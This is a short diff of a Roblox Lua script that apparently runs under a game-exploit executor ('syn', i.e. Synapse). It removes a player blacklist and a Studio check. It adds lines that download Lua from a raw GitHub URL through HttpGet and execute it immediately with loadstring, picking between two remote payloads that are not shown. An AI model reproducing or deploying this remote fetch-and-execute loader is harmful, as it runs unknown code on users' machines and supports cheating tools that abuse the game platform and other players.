@@ -1,11 +1,7 @@
-local blacklist = {"aishaqil_support", "SpectralParoxysm"}
-
-if game.Players.LocalPlayer.Name == blacklist then
-game:Shutdown()
+if syn then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/Check"))('BRUH')
 else
-if game:service('RunService'):IsStudio() then print('!STUDIO!') else
-	if game:service('CoreGui'):findFirstChild('LogHolder') then return nil
-	end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/f"))('BRUH')
 end
 
 local LogHolder = Instance.new("ScreenGui")
